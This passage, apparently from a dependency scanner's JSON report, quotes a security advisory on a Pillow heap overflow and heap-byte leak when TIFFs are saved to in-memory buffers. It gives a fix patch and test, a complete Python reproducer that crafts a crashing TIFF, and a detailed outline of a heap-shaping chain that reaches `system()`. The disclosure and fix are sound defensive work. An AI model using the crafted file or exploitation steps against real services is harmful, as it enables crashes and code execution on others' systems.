0xfe) and once with `MALLOC_PERTURB_=170` (0x55), gives two 369 463-byte TIFFs that differ in exactly 4 bytes, 0xfe vs 0x55, at offsets 369177, 369417, 369423, 369451 — the pad byte between the odd-length last strip and the IFD, and the pad byte after each odd-length tag value except the last. The same save to a filename gives byte-identical files with 0x00 there. Without any allocator tweaks, after a few 64 KB–400 KB Python `bytes` objects filled with 0xa7 are created and freed, re-saving an uploaded LZW TIFF carrying ten odd-length ASCII tags yields 0xa7 at all nine pad offsets.\n\n### Code walk-through\n\nThe sink's state is `{data, size (allocated), loc (position), eof (high-water mark)}`; the encoder path starts it as a zeroed 64 KiB block (`TiffDecode.c:863`, `calloc(bufsize, 1)` with `bufsize = 64*1024`, `flrealloc = 1`). Seeking is unconstrained:\n\n```c\n/* src/libImaging/TiffDecode.c:124-141  _tiffSeekProc */\n    case 0: state-\u003eloc = off;            break;   /* may exceed eof and size */\n    case 1: state-\u003eloc += off;           break;\n    case 2: state-\u003eloc = state-\u003eeof + off; break;\n```\n\nand writing assumes `loc \u003c= size`:\n\n```c\n/* src/libImaging/TiffDecode.c:90-117  _tiffWriteProc */\n    to_write = MIN(size, state-\u003esize - (tsize_t)state-\u003eloc);   /* negative if loc \u003e size */\n    if (state-\u003eflrealloc \u0026\u0026 size \u003e to_write) {\n        tsize_t newsize = state-\u003esize;\n        while (newsize \u003c (size + state-\u003esize)) {               /* capacity target ignores loc */\n            …\n            newsize += 64 * 1024;\n        }\n        new_data = realloc(state-\u003edata, newsize);              /* tail left uninitialised */\n        …\n        state-\u003esize = newsize;\n        to_write = size;\n    }\n    _TIFFmemcpy((UINT8 *)state-\u003edata + state-\u003eloc, buf, to_write);   /* :115 */\n    state-\u003eloc += (toff_t)to_write;\n    state-\u003eeof = MAX(state-\u003eloc, state-\u003eeof);\n```\n\nA gdb trace of the sink calls during the overflowing save (stock build, breakpoints on the two procs) shows how libtiff drives it:\n\n```\nwrite size=63064 at loc=8      (eof=8     size=65536)     strip data (PackBits re-encode:\nwrite size=2464  at loc=63072  (eof=63072 size=65536)      8 bytes/row × 8191 rows)\nseek  off=0     whence=2       -\u003e loc=65536 = eof = size   TIFFWriteDirectory: end of data, already even\nseek  off=4;  write size=4 at loc=4                        link IFD offset into header\nseek  off=65662 whence=0       (eof=65536 size=65536)      65536 + 126-byte IFD (10 entries) = tag data area\nwrite size=65536 at loc=65662  (eof=65536 size=65536)      ImageDescription, first out-of-line value\n```\n\nFor that last call `to_write = 65536 − 65662 = −126`, the loop grows `newsize` until it is ≥ `65536 + 65536`, i.e. to 131072, and the `memcpy` writes `[65662, 131198)` into a 131072-byte block: 126 bytes past the end, containing the last 126 bytes of the description string. `loc`/`eof` become 131198 \u003e `size`; `ImagingLibTiffEncode` later sets `size = eof` (`:1067`) and copies `[0, eof)` out of the same block (`:1073`), reading past it as well.\n\nThe general condition is: at directory-write time the strip data ends within *IFD-size* bytes of the current allocation boundary, and the first out-of-line tag value has a length just below a multiple of 64 KiB. The overrun length is `IFD size + pad − slack`, so it grows by 12 bytes per additional tag. For single-band images (L, P, 1, I;16, F…) `BitsPerSample` is stored inline and the first out-of-line value in tag order is `DocumentName` (269) or `ImageDescription` (270) — both free-length ASCII strings taken from the source file. Pillow re-encodes the pixels itself, but with PackBits the compressed size is a deterministic function of attacker-chosen pixel rows (the reproducer uses rows of 7 distinct bytes → 8 bytes per row → exactly 65536 bytes including the 8-byte header), so the attacker controls both quantities. For multi-band images the 6-byte `BitsPerSample` array is written first and absorbs the growth, which is why RGB sources do not hit the overflow.\n\nThe disclosure half is the benign version of the same sequence. In the LZW/RGB trace the strip data ends at the odd offset 369177; libtiff places the IFD at 369178 and the tag values from 369364 on, and after each odd-length value seeks one byte forward before the next write (`seek off=369418 (loc=369417)`, `write size=5 at loc=369418`, …). Offsets 369177, 369417, 369423 and 369451 are therefore never written. They lie in the part of the buffer obtained by the `realloc()` calls at `:103` (the block grew 65536 → 196608 → 327680 → 458752 during the strip writes), which is not cleared, so the emitted file carries the previous heap contents at those positions. Holes that fall inside the initial 64 KiB are zero only because that block is `calloc`'d.\n\nThe defect was introduced in e782fe721e01 (\"initial merge of wiredfool/Python-Imaging-Library-G4-Tiff-Support\", 2013-03-08), first released in Pillow 2.0.0.\n\n## Impact\n\nAny service that accepts an image and produces a TIFF rendition into a non-file object — the usual pattern for returning or uploading the result without touching disk — is exposed to whoever supplies the image, with no non-default Pillow setting involved. The overflow additionally requires that an attacker-controlled out-of-line tag value reaches libtiff: the uploaded ImageDescription/DocumentName/XMP when the application saves the opened TIFF itself (or copies its tags into the save), or the embedded ICC profile, which survives `convert()`/`resize()`/`thumbnail()`/`copy()` in `im.info` together with the compression. Under those conditions, with a crafted single-band TIFF the uploader gets a heap out-of-bounds write in the worker process of IFD-size bytes (12 bytes per directory entry the upload carries — 126 bytes with the minimal reproducer, 2384 bytes with a 331-entry IFD) immediately past a 128 KiB-class `realloc` block, with the overwritten bytes being the tail of a tag value they chose; on the stock build the minimal reproducer is detected by glibc and kills the process (`SIGABRT`).\n\nGiven two addresses leaked by a separate bug, this write has been turned into code execution against a stock build of this commit with ASLR/PIE/NX enabled and default settings (that proof-of-concept is not included with this report): a single-process stdlib `http.server` worker doing nothing but `Image.open(BytesIO(body)).save(BytesIO(), \"TIFF\")` per upload executed an attacker-chosen shell command (`id\u003e/tmp/r.XXXXXX`), answered `200` and kept serving (12/12 against a freshly started worker, 2/6 after twenty unrelated uploads; a miss normally leaves the worker running and is retryable). The two addresses (`\u0026system`, `\u0026PyBytes_Type`) were taken from an unrelated information disclosure in the same process; everything else is this bug plus properties of Pillow's TIFF reader used as a heap-shaping script. The 4.7 MB attack TIFF is a 397×165 8-bit PackBits image whose rows re-encode to exactly 65 528 bytes (strip ends at sink offset 65 536), a 63 942-byte XMP packet (tag 700) as the first out-of-line value, and ~500 private IFD entries. Because `TiffImagePlugin` turns every IFD entry into one `bytes` object in IFD order, frees an earlier entry when a later one repeats its tag number, and parses the IFD three times per request (`TiffImagePlugin.py:1258`, `:1271`, and `getexif()` from `load_end()` at `:1331`), those entries drain glibc's free lists, punch exact-size holes for every large allocation the save makes, and arrange that the 128 KiB `realloc` of the sink lands directly below a live 0x540 chunk followed by libtiff's own `TIFF` handle (`malloc(1313)` from `TIFFClientOpen`). The 2384 overflowing bytes rewrite the start of the `TIFF` struct with the command string, a zeroed `tif_dir`, `tif_diroff = 65536`, and `tif_cleanup = system` at +0x3f8; libtiff resumes `TIFFWriteDirectorySec` on the modified handle and calls `(*tif-\u003etif_cleanup)(tif)`. With gdb on `__libc_system` the call arrives as `__libc_system(\"id\u003e/tmp/r.…\") ← libtiff.so.6 ← TIFFFlush ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1056) ← _encode (src/encode.c:139)`. Offsets are per-binary constants (glibc 2.36, CPython 3.12.14, libtiff 4.5.0, this `_imaging.so`), all obtainable from public distribution files.\n\nIndependently, every compressed TIFF written to such a target that exceeds 64 KiB discloses one byte of stale heap per alignment hole (one per odd-length tag value plus possibly one before the IFD; the count is set by the tags in the uploaded file) at predictable offsets in the returned file — low bandwidth, but it is other requests' freed data. File-path and real-fd targets (`TIFFFdOpen`) are unaffected by either issue. The primitive is the same class and attacker position as the `TiffDecode.c` decode-side heap overflows CVE-2020-35654, CVE-2021-25289 and CVE-2020-10379, but on the encode path and behind the output-to-a-non-file and tag-passthrough preconditions above, with code execution additionally depending on an address leak from another bug.\n\n## Reproducing\n\n`repro` is a single Python script that uses the installed Pillow, writes its inputs into a temporary directory. It has two parts. Each part compares saving to a file path, which goes through `TIFFFdOpen` and is correct, with the same save into an `io.BytesIO`, which goes through the `_tiffWriteProc` memory sink.\n\n**Part 1: heap overflow.** `setup_env()` builds `upload.tif` (131 198 bytes) byte by byte: a mode L, 7×8191 image with `Compression=32773` (PackBits) and a 65 535-character `ImageDescription`. The sizes are picked so that when Pillow re-encodes the pixels, the strip comes to 8 + 8191 × 8 = 65 536 bytes and ends exactly at the sink's initial 64 KiB buffer. libtiff then seeks past the 126-byte IFD and writes the 65 536-byte description at offset 65 662. The sink grows only to 131 072 bytes, so the last 126 bytes of the description are written past the end of the heap block. In a fresh child process, the script runs `Image.open(\"upload.tif\").save(\u003ctarget\u003e, \"TIFF\")` with no options, once with `\"out.tif\"` as the target and once with `io.BytesIO()`. The file save exits with 0. The BytesIO save is killed by SIGABRT, with glibc reporting `malloc(): corrupted top size`.\n\n**Part 2: stale heap bytes in the output.** A child started with `MALLOC_PERTURB_=170` (glibc fills fresh allocations with 0x55) saves a seeded-noise 300×300 RGB image with `compression=\"tiff_lzw\"` and four odd-length ASCII tags. It saves once to a file and once to a BytesIO, then prints every offset where the two outputs differ. libtiff skips one pad byte before the IFD and one after each odd-length tag value. The file has 0x00 at those offsets, but the BytesIO output still holds the 0x55 that was in uninitialised `realloc()` memory.\n\nExpected output on this tree:\n\n```\nupload.tif: 131198 bytes\nsave to file path : exit code 0, out.tif = 131210 bytes\nsave to BytesIO   : exit code -6, stderr: 'malloc(): corrupted top size'\n-\u003e heap overflow crashed the process: True\n\nsame image, same options, saved to a file path vs. to a BytesIO:\n  offset 369177: file 0x00   BytesIO 0x55\n  offset 369417: file 0x00   BytesIO 0x55\n  offset 369423: file 0x00   BytesIO 0x55\n  offset 369451: file 0x00   BytesIO 0x55\n\n-\u003e BytesIO output contains never-written heap bytes: True\n\nBUG\n```\n\nThe last line is `BUG` if either part shows its defect, and `OK` otherwise. With the attached patch applied and rebuilt, the BytesIO save exits with 0, the two outputs are identical, and the script prints `OK`.\n\n## Suggested fix\n\nThe attached patch makes `_tiffWriteProc` in `src/libImaging/TiffDecode.c` honour sparse-file semantics: it sizes the buffer from the write position, and zeroes what `realloc()` adds (the initial block is already `calloc`'d, so every byte libtiff skips then reads as 0, exactly as through `TIFFFdOpen`). For the non-reallocating case (`flrealloc == 0`), where `loc \u003e size` would also make `to_write` negative, it rejects the write with a `TIFFError`, the same idiom `_tiffReadProc` uses:\n\n```diff\n-        while (newsize \u003c (size + state-\u003esize)) {\n+        while (newsize \u003c (size + (tsize_t)state-\u003eloc)) {\n …\n+        memset((UINT8 *)new_data + state-\u003esize, 0, newsize - state-\u003esize);\n         state-\u003edata = new_data;\n         state-\u003esize = newsize;\n         to_write = size;\n+    } else if (to_write \u003c 0) {\n+        TIFFError(\"_tiffWriteProc\", \"Invalid Write at loc %\" PRIu64 \", size: %\" PRIu64, …);\n+        return 0;\n     }\n```\n\n`_tiffSeekProc` is left unconstrained, since libtiff legitimately seeks past the end of data; with the write proc fixed, `eof` can no longer exceed `size`, so the read-out in `ImagingLibTiffEncode` (`:1067`, `:1073`) stays within the block. The patch also adds `test_save_bytesio_seek_past_end` to `Tests/test_file_libtiff.py`, which saves the PackBits 64 KiB-boundary case and an LZW case with odd-length tags to both a file and a `BytesIO` and asserts the outputs are identical. With the patch applied and rebuilt, the BytesIO output is byte-identical to the file output, no AddressSanitizer report is produced for tag lengths 65410/65535/131071/196607, the code-execution chain described under Impact no longer runs its command, and the existing TIFF tests pass.\n\n## The patch\n\nSize the libtiff in-memory write buffer from the write position, not its current size, and zero the space added by realloc in _tiffWriteProc\n\nApplies to `src/libImaging/TiffDecode.c` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..d2a926a62 100644\n--- a/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -760,6 +760,38 @@ class TestFileLibTiff(LibTiffTestCase):\n         save_bytesio(\"packbits\")\n         save_bytesio(\"tiff_lzw\")\n \n+    def test_save_bytesio_seek_past_end(self, tmp_path: Path) -\u003e None:\n+        # When writing the directory, libtiff seeks past the end of the data\n+        # written so far, and then writes the tag values there. Check that the\n+        # in-memory write buffer grows to fit, and that the bytes that are\n+        # skipped over are zero, as they would be when writing to a file.\n+\n+        # 7 distinct bytes per row: PackBits emits 8 bytes per row, so the strip\n+        # plus the header are exactly 64 KiB, the initial size of the buffer\n+        im = Image.new(\"L\", (7, 8191))\n+        im.putdata([(i * 37) \u0026 0xFF for i in range(7 * 8191)])\n+        kwargs = {\"compression\": \"packbits\", \"description\": \"D\" * 65535}\n+\n+        outfile = tmp_path / \"temp.tif\"\n+        im.save(outfile, **kwargs)\n+        buffer_io = io.BytesIO()\n+        im.save(buffer_io, format=\"tiff\", **kwargs)\n+        assert buffer_io.getvalue() == outfile.read_bytes()\n+\n+        # odd-length tag values, so that libtiff pads between them. Large enough\n+        # that the buffer has to be reallocated\n+        im = hopper().resize((300, 300))\n+        kwargs = {\n+            \"compression\": \"tiff_lzw\",\n+            \"description\": \"abcdef\",\n+            \"software\": \"xyz0\",\n+            \"tiffinfo\": {315: \"artist\", 33432: \"copyright!\"},\n+        }\n+        im.save(outfile, **kwargs)\n+        buffer_io = io.BytesIO()\n+        im.save(buffer_io, format=\"tiff\", **kwargs)\n+        assert buffer_io.getvalue() == outfile.read_bytes()\n+\n     def test_save_ycbcr(self, tmp_path: Path) -\u003e None:\n         im = hopper(\"YCbCr\")\n         outfile = tmp_path / \"temp.tif\"\ndiff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\nindex 8a57c523d..dd9945493 100644\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ -87,11 +87,13 @@ _tiffWriteProc(thandle_t hdata, tdata_t buf, tsize_t size) {\n     TRACE((\"_tiffWriteProc: %d \\n\", (int)size));\n     dump_state(state);\n \n+    // libtiff may have seeked past the end of the buffer, e.g. when writing the\n+    // directory, so the required size is based on the current location.\n     to_write = MIN(size, state-\u003esize - (tsize_t)state-\u003eloc);\n     if (state-\u003eflrealloc \u0026\u0026 size \u003e to_write) {\n         tdata_t new_data;\n         tsize_t newsize = state-\u003esize;\n-        while (newsize \u003c (size + state-\u003esize)) {\n+        while (newsize \u003c (size + (tsize_t)state-\u003eloc)) {\n             if (newsize \u003e INT_MAX - 64 * 1024) {\n                 return 0;\n             }\n@@ -105,9 +107,20 @@ _tiffWriteProc(thandle_t hdata, tdata_t buf, tsize_t size) {\n             // fail out\n             return 0;\n         }\n+        // zero the new space, so that any bytes libtiff seeks over without\n+        // writing are 0 in the output, as they would be in a file\n+        memset((UINT8 *)new_data + state-\u003esize, 0, newsize - state-\u003esize);\n         state-\u003edata = new_data;\n         state-\u003esize = newsize;\n         to_write = size;\n+    } else if (to_write \u003c 0) {\n+        TIFFError(\n+            \"_tiffWriteProc\",\n+            \"Invalid Write at loc %\" PRIu64 \", size: %\" PRIu64,\n+            state-\u003eloc,\n+            (toff_t)state-\u003esize\n+        );\n+        return 0;\n     }\n \n     TRACE((\"to_write: %d\\n\", (int)to_write));\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 5,434 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPillow: heap overflow + stale heap bytes in the libtiff in-memory write sink\n(_tiffWriteProc, src/libImaging/TiffDecode.c).\n\nim.save(\u003cBytesIO\u003e, \"TIFF\") with any compression goes through libtiff writing\ninto Pillow's memory sink. When libtiff writes the directory it seeks *past*\nthe end of the data written so far and writes tag values there:\n\n  1. _tiffWriteProc grows the buffer to `size + write_len` instead of\n     `loc + write_len`, so that write can run off the end of the allocation.\n  2. The bytes libtiff skipped over are never written, so whatever the heap\n     held there ends up in the output file.\n\nThe same saves to a file path are fine (the kernel zero-fills skipped bytes),\nwhich is the control for both parts.\n\"\"\"\nimport os\nimport resource\nimport struct\nimport subprocess\nimport sys\nimport tempfile\n\nresource.setrlimit(resource.RLIMIT_CORE, (0, 0))   # the overflow aborts; no core file\nos.chdir(tempfile.mkdtemp())\n\n\ndef run(code, **env):\n    \"\"\"Run a Python snippet against the installed Pillow in a fresh process.\"\"\"\n    return subprocess.run([sys.executable, \"-c\", code], env={**os.environ, **env},\n                          capture_output=True, text=True)\n\n\ndef setup_env():\n    \"\"\"Write upload.tif: an L-mode 7x8191 PackBits TIFF with a 65535-char ImageDescription.\n\n    Sizes are chosen so that, when Pillow re-encodes it:\n      - the PackBits strip is 8191 rows x 8 bytes + 8-byte header = 65536 bytes,\n        i.e. the data ends exactly at the sink's initial 64 KiB buffer;\n      - the first out-of-line tag value (ImageDescription + NUL) is 65536 bytes\n        and goes at 65536 + 126 (the 10-entry IFD sits in between).\n    The sink grows to 65536 + 65536 = 131072 bytes, then writes [65662, 131198):\n    the last 126 bytes of the description land past the end of the heap block.\n    \"\"\"\n    w, h = 7, 8191\n    # 7 distinct bytes per row -\u003e PackBits can only emit one literal run: 1 + 7 bytes\n    strip = b\"\".join(b\"\\x06\" + bytes((y * 7 + x) * 37 \u0026 0xFF for x in range(w)) for y in range(h))\n    desc = b\"D\" * 65535 + b\"\\x00\"\n    strip_off, desc_off = 8, 8 + len(strip)\n    ifd_off = desc_off + len(desc)\n    entries = [\n        (256, 4, 1, w),                  # ImageWidth\n        (257, 4, 1, h),                  # ImageLength\n        (258, 3, 1, 8),                  # BitsPerSample\n        (259, 3, 1, 32773),              # Compression = PackBits (inherited by save())\n        (262, 3, 1, 1),                  # PhotometricInterpretation = BlackIsZero\n        (270, 2, len(desc), desc_off),   # ImageDescription (carried into save() via tag_v2)\n        (273, 4, 1, strip_off),          # StripOffsets\n        (277, 3, 1, 1),                  # SamplesPerPixel\n        (278, 4, 1, h),                  # RowsPerStrip\n        (279, 4, 1, len(strip)),         # StripByteCounts\n    ]\n    ifd = struct.pack(\"\u003cH\", len(entries))\n    ifd += b\"\".join(struct.pack(\"\u003cHHII\", *e) for e in entries)\n    ifd += struct.pack(\"\u003cI\", 0)\n    with open(\"upload.tif\", \"wb\") as f:\n        f.write(struct.pack(\"\u003c2sHI\", b\"II\", 42, ifd_off) + strip + desc + ifd)\n\n\n# ---------------------------------------------------------------------------\n# Part 1: heap buffer overflow. Re-save an uploaded TIFF with no options.\n# ---------------------------------------------------------------------------\nsetup_env()\nprint(f\"upload.tif: {os.path.getsize('upload.tif')} bytes\")\n\nRESAVE = 'from PIL import Image; import io; Image.open(\"upload.tif\").save({target}, \"TIFF\")'\n\n# Control: saving to a file path (real fd, no memory sink) works\ncontrol = run(RESAVE.format(target='\"out.tif\"'))\nprint(f\"save to file path : exit code {control.returncode}, out.tif = {os.path.getsize('out.tif')} bytes\")\n\n# PoC: the identical save into a BytesIO\npoc = run(RESAVE.format(target=\"io.BytesIO()\"))\nprint(f\"save to BytesIO   : exit code {poc.returncode}, stderr: {poc.stderr.strip()!r}\")\n\n# A process killed by a signal (SIGABRT from glibc's heap check) = heap corrupted\noverflow = control.returncode == 0 and poc.returncode \u003c 0\nprint(f\"-\u003e heap overflow crashed the process: {overflow}\\n\")\n\n\n# ---------------------------------------------------------------------------\n# Part 2: stale heap bytes in the output. MALLOC_PERTURB_=170 makes glibc fill\n# fresh allocations with 0x55, so never-written bytes become visible.\n# ---------------------------------------------------------------------------\nSTALE = r'''\nimport io, random\nfrom PIL import Image\nrandom.seed(1)\nim = Image.new(\"RGB\", (300, 300))      # noise -\u003e ~360 KB LZW, so the sink must realloc()\nim.putdata([tuple(random.randrange(256) for _ in \"rgb\") for _ in range(300 * 300)])\n# odd-length ASCII tags: libtiff skips one pad byte after each\nkw = dict(compression=\"tiff_lzw\", description=\"abcdef\", software=\"xyz0\",\n          tiffinfo={315: \"artist\", 33432: \"copyright!\", 306: \"2024:01:01 00:00:00\"})\nim.save(\"ref.tif\", \"TIFF\", **kw)\nbuf = io.BytesIO()\nim.save(buf, \"TIFF\", **kw)\na, b = open(\"ref.tif\", \"rb\").read(), buf.getvalue()\nfor i in (i for i in range(len(a)) if a[i] != b[i]):\n    print(f\"  offset {i}: file 0x{a[i]:02x}   BytesIO 0x{b[i]:02x}\")\n'''\nstale = run(STALE, MALLOC_PERTURB_=\"170\").stdout\nprint(\"same image, same options, saved to a file path vs. to a BytesIO:\")\nprint(stale or \"  outputs identical\")\nleak = \"BytesIO 0x55\" in stale\nprint(f\"-\u003e BytesIO output contains never-written heap bytes: {leak}\\n\")\n\nprint(\"BUG\" if overflow or leak else \"OK\")\n```\n\u003c/details\u003e\n\n---"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112393](https://osv.dev/CVE-2026-112393)**.\n\n## [GHSA-332p-7hrc-92wf](https://osv.dev/GHSA-332p-7hrc-92wf)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e Heap buffer overflow in _tiffWriteProc when saving TIFF to BytesIO\n\u003e Location: src/libImaging/TiffDecode.c:94  in _tiffWriteProc()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e Pillow can write attacker-chosen data past the end of a heap buffer when it saves a TIFF image to an in-memory destination such as `io.BytesIO` rather than to a file. The same code also copies leftover heap memory from the process into the saved file. Anyone who can supply an image to a service that opens it and re-saves it as TIFF this way can trigger this with default settings. The attached reproducer crashes the process, and the overflow could potentially be developed further, but code execution is not demonstrated here.\n\u003e \n\u003e The bug is in `_tiffWriteProc` in `src/libImaging/TiffDecode.c`. This is the write callback for the in-memory sink that Pillow gives libtiff whenever the save target has no `fileno()`. While writing the directory, libtiff seeks past the current end of data and writes tag values there. `_tiffWriteProc` sizes its `realloc()` from `state-\u003esize + size` instead of from the write position `state-\u003eloc`. As a result, the first out-of-line tag value written after that seek can run past the allocation by up to the size of the directory: 12 bytes per entry, 126 bytes in the minimal case, and 2384 bytes observed with a 331-entry directory. The overflowing bytes are the tail of a tag value taken from the uploaded file.\n\u003e \n\u003e No save options are needed, because compression and tags are inherited from the source image. The overflow does require an attacker-sized out-of-line tag to reach libtiff. That happens when the opened TIFF is saved directly (ImageDescription, DocumentName or XMP), or through an embedded ICC profile, which survives `copy()` in `im.info`. The bytes libtiff skips for alignment are never initialised, so any compressed TIFF over 64 KiB written this way also leaks one stale heap byte per padding hole. That leak needs no crafted tag.\n\u003e \n\u003e The attached reproducer builds a 131 KB PackBits TIFF and runs `Image.open(...).save(io.BytesIO(), \"TIFF\")`. Saving the same image to a file path succeeds, but the `BytesIO` save aborts with glibc's `malloc(): corrupted top size`. A second part of the script shows uninitialised heap bytes at the padding offsets of a `BytesIO` save that are zero in the file save. Saves to real files are unaffected. The defect dates to e782fe721e01 (2013) and has been present since Pillow 2.0.0.\n\u003e \n\u003e ## Details\n\u003e \n\u003e When `im.save()` writes a TIFF through libtiff to a target that has no usable `fileno()` (`io.BytesIO`, an HTTP response object, a storage backend stream), libtiff is opened with `TIFFClientOpen()` on Pillow's own in-memory sink, `_tiffWriteProc` / `_tiffSeekProc` in `src/libImaging/TiffDecode.c`. libtiff treats that sink like a file: when it writes the directory it seeks *beyond* the current end of data (to `eof + IFD size`, where the out-of-line tag values go, and one byte further after every odd-length tag value to keep offsets even) and writes there. On a real file the kernel grows the file and zero-fills the gap. The memory sink does neither correctly:\n\u003e \n\u003e 1. `_tiffWriteProc` sizes its `realloc()` from `state-\u003esize + size` instead of `state-\u003eloc + size`, so the first write after such a seek can land past the end of the new allocation — a heap buffer overflow whose content is tag data taken from the image being saved.\n\u003e 2. The bytes that libtiff skips are never written, and the grown region is a bare `realloc()`, so they reach the output TIFF with whatever the heap held before.\n\u003e \n\u003e Both are reachable with default settings by the ordinary \"re-encode the upload\" sequence `Image.open(upload); im.save(io.BytesIO(), \"TIFF\")` with no save options: `compression` defaults to the source file's (`src/PIL/TiffImagePlugin.py:1734`), any compression other than raw selects the libtiff writer (`:1746`), the source's `tag_v2` entries are passed through to libtiff (`:1959`), and a target without `fileno()` leaves `_fp = 0` (`:1928-1935`), i.e. the memory sink. The overflow half additionally needs an attacker-controlled out-of-line tag value of the right length to reach libtiff. With the opened `TiffImageFile` saved directly (`tag_v2` passthrough) that can be a ~64 KiB ASCII tag (269/270/271/272) or the XMP packet (tag 700, type BYTE — arbitrary bytes), and the number of tags the upload carries sets the IFD size, i.e. the overrun length (12 bytes per entry; 2384 bytes with a 331-entry IFD observed). After `convert()`/`resize()`/`thumbnail()`/`copy()` the `tag_v2` entries are gone, but `im.info[\"compression\"]` (still selecting libtiff) and `im.info[\"icc_profile\"]` survive and the ICC profile is written as tag 34675 (`:1822-1824`), an equally attacker-controlled out-of-line value: `Image.open(x).copy().save(BytesIO(), \"TIFF\")` with the payload in the ICC profile produces the identical ASan report. The stale-byte half needs no attacker tag at all.\n\u003e \n\u003e **Proof (overflow).** A 131 198-byte hand-built TIFF — mode L, 7×8191, `Compression=32773` (PackBits), an `ImageDescription` of 65 535 characters — opened with `Image.open()` and saved with `im.save(io.BytesIO(), \"TIFF\")` aborts a stock build with glibc's `malloc(): corrupted top size`. The same call against an AddressSanitizer build of the C extensions reports\n\u003e \n\u003e ```\n\u003e AddressSanitizer: heap-buffer-overflow ... WRITE of size 65536\n\u003e  #1 _tiffWriteProc src/libImaging/TiffDecode.c:115\n\u003e  #4 TIFFFlush\n\u003e  #5 ImagingLibTiffEncode src/libImaging/TiffDecode.c:1056\n\u003e 0 bytes to the right of 131072-byte region, allocated by realloc in _tiffWriteProc src/libImaging/TiffDecode.c:103\n\u003e ```\n\u003e \n\u003e **Proof (uninitialised bytes).** Saving one 300×300 RGB image as `compression=\"tiff_lzw\"` with four odd-length ASCII tags to a `BytesIO`, once with `MALLOC_PERTURB_=1` (glibc fills fresh allocations with 0xfe) and once with `MALLOC_PERTURB_=170` (0x55), gives two 369 463-byte TIFFs that differ in exactly 4 bytes, 0xfe vs 0x55, at offsets 369177, 369417, 369423, 369451 — the pad byte between the odd-length last strip and the IFD, and the pad byte after each odd-length tag value except the last. The same save to a filename gives byte-identical files with 0x00 there. Without any allocator tweaks, after a few 64 KB–400 KB Python `bytes` objects filled with 0xa7 are created and freed, re-saving an uploaded LZW TIFF carrying ten odd-length ASCII tags yields 0xa7 at all nine pad offsets.\n\u003e \n\u003e ### Code walk-through\n\u003e \n\u003e The sink's state is `{data, size (allocated), loc (position), eof (high-water mark)}`; the encoder path starts it as a zeroed 64 KiB block (`TiffDecode.c:863`, `calloc(bufsize, 1)` with `bufsize = 64*1024`, `flrealloc = 1`). Seeking is unconstrained:\n\u003e \n\u003e ```c\n\u003e /* src/libImaging/TiffDecode.c:124-141  _tiffSeekProc */\n\u003e     case 0: state-\u003eloc = off;            break;   /* may exceed eof and size */\n\u003e     case 1: state-\u003eloc += off;           break;\n\u003e     case 2: state-\u003eloc = state-\u003eeof + off; break;\n\u003e ```\n\u003e \n\u003e and writing assumes `loc \u003c= size`:\n\u003e \n\u003e ```c\n\u003e /* src/libImaging/TiffDecode.c:90-117  _tiffWriteProc */\n\u003e     to_write = MIN(size, state-\u003esize - (tsize_t)state-\u003eloc);   /* negative if loc \u003e size */\n\u003e     if (state-\u003eflrealloc \u0026\u0026 size \u003e to_write) {\n\u003e         tsize_t newsize = state-\u003esize;\n\u003e         while (newsize \u003c (size + state-\u003esize)) {               /* capacity target ignores loc */\n\u003e             …\n\u003e             newsize += 64 * 1024;\n\u003e         }\n\u003e         new_data = realloc(state-\u003edata, newsize);              /* tail left uninitialised */\n\u003e         …\n\u003e         state-\u003esize = newsize;\n\u003e         to_write = size;\n\u003e     }\n\u003e     _TIFFmemcpy((UINT8 *)state-\u003edata + state-\u003eloc, buf, to_write);   /* :115 */\n\u003e     state-\u003eloc += (toff_t)to_write;\n\u003e     state-\u003eeof = MAX(state-\u003eloc, state-\u003eeof);\n\u003e ```\n\u003e \n\u003e A gdb trace of the sink calls during the overflowing save (stock build, breakpoints on the two procs) shows how libtiff drives it:\n\u003e \n\u003e ```\n\u003e write size=63064 at loc=8      (eof=8     size=65536)     strip data (PackBits re-encode:\n\u003e write size=2464  at loc=63072  (eof=63072 size=65536)      8 bytes/row × 8191 rows)\n\u003e seek  off=0     whence=2       -\u003e loc=65536 = eof = size   TIFFWriteDirectory: end of data, already even\n\u003e seek  off=4;  write size=4 at loc=4                        link IFD offset into header\n\u003e seek  off=65662 whence=0       (eof=65536 size=65536)      65536 + 126-byte IFD (10 entries) = tag data area\n\u003e write size=65536 at loc=65662  (eof=65536 size=65536)      ImageDescription, first out-of-line value\n\u003e ```\n\u003e \n\u003e For that last call `to_write = 65536 − 65662 = −126`, the loop grows `newsize` until it is ≥ `65536 + 65536`, i.e. to 131072, and the `memcpy` writes `[65662, 131198)` into a 131072-byte block: 126 bytes past the end, containing the last 126 bytes of the description string. `loc`/`eof` become 131198 \u003e `size`; `ImagingLibTiffEncode` later sets `size = eof` (`:1067`) and copies `[0, eof)` out of the same block (`:1073`), reading past it as well.\n\u003e \n\u003e The general condition is: at directory-write time the strip data ends within *IFD-size* bytes of the current allocation boundary, and the first out-of-line tag value has a length just below a multiple of 64 KiB. The overrun length is `IFD size + pad − slack`, so it grows by 12 bytes per additional tag. For single-band images (L, P, 1, I;16, F…) `BitsPerSample` is stored inline and the first out-of-line value in tag order is `DocumentName` (269) or `ImageDescription` (270) — both free-length ASCII strings taken from the source file. Pillow re-encodes the pixels itself, but with PackBits the compressed size is a deterministic function of attacker-chosen pixel rows (the reproducer uses rows of 7 distinct bytes → 8 bytes per row → exactly 65536 bytes including the 8-byte header), so the attacker controls both quantities. For multi-band images the 6-byte `BitsPerSample` array is written first and absorbs the growth, which is why RGB sources do not hit the overflow.\n\u003e \n\u003e The disclosure half is the benign version of the same sequence. In the LZW/RGB trace the strip data ends at the odd offset 369177; libtiff places the IFD at 369178 and the tag values from 369364 on, and after each odd-length value seeks 